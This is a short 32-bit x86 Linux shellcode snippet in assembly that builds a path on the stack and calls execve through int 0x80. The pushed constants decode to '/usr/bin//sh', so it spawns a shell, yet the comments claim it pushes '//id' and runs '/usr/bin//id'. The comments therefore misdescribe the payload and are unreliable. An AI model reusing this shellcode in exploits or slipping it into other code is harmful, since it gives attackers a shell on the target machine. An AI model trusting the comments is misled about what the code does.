BITS 32

  xor eax, eax      
  push eax          
  push 0x68732f2f   ; push "//id"
  push 0x6e69622f   ; push "/bin" 
  push 0x7273752f
  mov ebx, esp      ; put the address of "/usr/bin//id" into ebx, via esp
  push eax        
  mov edx, esp      
  push ebx          ; push string addr to stack 
  mov ecx, esp      ; this is the argv array 
  mov al, 11        ; syscall 11
  int 0x80         

